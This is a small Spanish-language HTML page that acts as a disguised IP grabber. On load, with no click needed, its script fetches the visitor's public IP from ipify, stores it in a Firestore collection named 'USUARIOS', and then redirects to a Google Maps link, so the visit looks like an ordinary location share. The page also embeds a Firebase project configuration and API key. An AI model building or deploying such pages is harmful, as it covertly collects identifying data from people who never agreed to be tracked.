<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dirreccion</title>
</head>
<body>
    <button id="btn">Mostrar direccion</button>
    <p id="ip"></p>

    <script type="module">
      // Import the functions you need from the SDKs you need
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js'
import {getFirestore, doc, setDoc, collection} from 'https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js'
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyBO3BUGbnbc0_lyECgZKdJ5-Sdj9uJXV5A",
  authDomain: "tstt-c8020.firebaseapp.com",
  projectId: "tstt-c8020",
  storageBucket: "tstt-c8020.firebasestorage.app",
  messagingSenderId: "343900539858",
  appId: "1:343900539858:web:f657e90a3f496e21f1d60b",
  measurementId: "G-L0PV23HW3C"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);


document.getElementById("btn").addEventListener("click",function(){
  getIP();
})


async function getIP(){
  try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const userRef = doc(collection(db,"USUARIOS"));
                await setDoc(userRef,{
                  numero: data.ip
                });
                window.location.href = "https://maps.app.goo.gl/bUW1quDoLoFgK5BM9";
            } catch (error) {
                console.error('Error fetching IP address:', error);
            }
}

getIP();


    </script>
</body>
</html>